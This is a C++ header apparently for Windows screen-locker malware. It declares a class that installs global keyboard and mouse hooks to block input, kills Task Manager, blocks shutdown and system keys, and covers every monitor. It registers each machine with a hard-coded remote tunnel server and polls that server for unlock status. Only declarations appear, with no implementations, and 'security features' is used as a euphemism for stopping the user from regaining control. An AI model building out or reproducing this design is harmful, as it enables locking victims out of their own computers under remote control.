#pragma once

#include <windows.h>
#include <string>
#include <winhttp.h>
#include <vector>
#include <tlhelp32.h>

// Browser configuration constants
#define BROWSER_WIDTH 600
#define BROWSER_HEIGHT 500
#define BROWSER_LOAD_DELAY 3000

// Window priority level constants
#define SCREENLOCKER_TOPMOST_LEVEL HWND_TOPMOST
#define BROWSER_TOPMOST_LEVEL HWND_TOPMOST

// Server configuration constants
#define SERVER_URL L"informational-invitation-built-sao.trycloudflare.com"
#define SERVER_PORT 443
#define USE_HTTPS true

class ScreenLocker {
private:
    // Basic member variables
    HINSTANCE hInstance;
    HWND hWnd;
    std::string userID;
    
    // Browser control related variables
    bool browserRunning;           // Prevents duplicate browser execution
    HWND browserHwnd;             // Browser window handle for priority control

    // Hook related variables
    static ScreenLocker* instance;     // 전역 Hook에서 접근하기 위한 static 인스턴스
    HHOOK keyboardHook;                // 키보드 Hook 핸들
    HHOOK mouseHook;                   // 마우스 Hook 핸들
    bool inputBlockingEnabled;         // 입력 차단 활성화 상태
    bool allowBrowserInput;            // 브라우저 입력 허용 상태
    bool performingSystemAction;       // 시스템 동작 수행 중 (Alt+A 등)

    // ↓↓↓ Advanced security features variables ↓↓↓
    bool advancedSecurityEnabled;      // Advanced security features enabled
    HWND taskManagerHwnd;              // Task manager window handle
    UINT_PTR securityCheckTimer;          // Security check timer ID

    // ↓↓↓ Multi-monitor support variables ↓↓↓
    std::vector<HWND> monitorWindows;        // Window handles for each monitor
    std::vector<MONITORINFO> monitorInfos;   // Monitor information
    int primaryMonitorIndex;                 // Index of the primary monitor
    bool multiMonitorEnabled;                // Multi-monitor feature enabled
    
    // Internal utility functions
    std::string GetMacAddress();
    std::string GenerateRandomID();
    std::string GetOrCreateUserID();
    void SaveToLogFile(const std::string& userID, const std::string& action);

    // HTTP communication functions (WinHTTP)
    bool SendUserRegistration();
    std::string CheckUserStatus();
    bool SendHttpRequest(const std::wstring& path, const std::wstring& method, 
                         const std::string& data = "", std::string* response = nullptr);
    std::wstring StringToWString(const std::string& str);
    std::string WStringToString(const std::wstring& wstr);
    std::string UrlEncode(const std::string& str);
    
    // Resource extraction functions
    bool ExtractRemoverExecutable();
    std::string GetRemoverPath();

    // Browser interaction functions
    void HandleUnlockProcess();       // 새로운 잠금 해제 처리 함수
    bool ExecuteRemoverWithAdmin();   // 제거 프로그램 실행 함수
    bool TestServerConnection();      // 서버 연결 테스트 함수
    
    // HTML content generation
    std::string GenerateHTMLContent();
    
    // Browser control
    void OpenControlledBrowser();
    
    // Window priority control functions
    void SetScreenLockerTopmost();
    void SetBrowserTopmost();
    void RestoreScreenLockerTopmost();
    
    // Browser window finding and control
    bool FindBrowserWindow();
    void ControlBrowserWindow();
    void ClickAllowButton();

    void ConfineCursorToBrowser();
    void ReleaseCursorConfinement();

    // Hook related functions
    bool InstallInputHooks();
    void RemoveInputHooks();

    // Hook related functions2
    void EnableInputBlocking();
    void DisableInputBlocking();
    void SetBrowserInputMode(bool allow);
    void SetSystemActionMode(bool performing);

    // Hook procedure (static)
    static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // Hook handling helper functions
    bool ShouldBlockKeyboardInput(WPARAM wParam, LPARAM lParam);
    bool ShouldBlockMouseInput(WPARAM wParam, LPARAM lParam);
    bool IsAllowedSystemKey(DWORD vkCode);

    // Advanced security features
    void EnableAdvancedSecurity();
    void DisableAdvancedSecurity();
    bool DetectAndBlockTaskManager();
    bool DetectAndBlockSystemShutdown();
    void BlockCriticalSystemProcesses();
    static void CALLBACK SecurityCheckCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime);

    // System process control
    bool IsTaskManagerRunning();
    bool TerminateTaskManager();
    bool BlockSystemKeys(DWORD vkCode, bool isSystemKey);

    // ↓↓↓ 다중 모니터 함수들 추가 ↓↓↓
    // 다중 모니터 지원
    void EnableMultiMonitorSupport();
    void DisableMultiMonitorSupport();
    bool DetectMonitors();
    bool CreateMonitorWindows();
    void DestroyMonitorWindows();
    static BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData);
    void UpdateMonitorConfiguration();
    HWND CreateSecondaryWindow(const MONITORINFO& monitorInfo, int monitorIndex);
    static LRESULT CALLBACK SecondaryWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
    
    // Cleanup function
    void Cleanup();
    
    // Window message handling
    static LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

public:
    // Constructor and destructor
    ScreenLocker(HINSTANCE hInst);
    ~ScreenLocker();
    
    // Main public functions
    bool Initialize();
    bool CreateMainWindow();
    int Run();
    
    // Browser status check (for debugging)
    bool IsBrowserRunning() const { return browserRunning; }

    // Hook status check
    bool IsInputBlockingEnabled() const { return inputBlockingEnabled; }
    
    // Static instance getter (used by Hook)
    static ScreenLocker* GetInstance() { return instance; }
};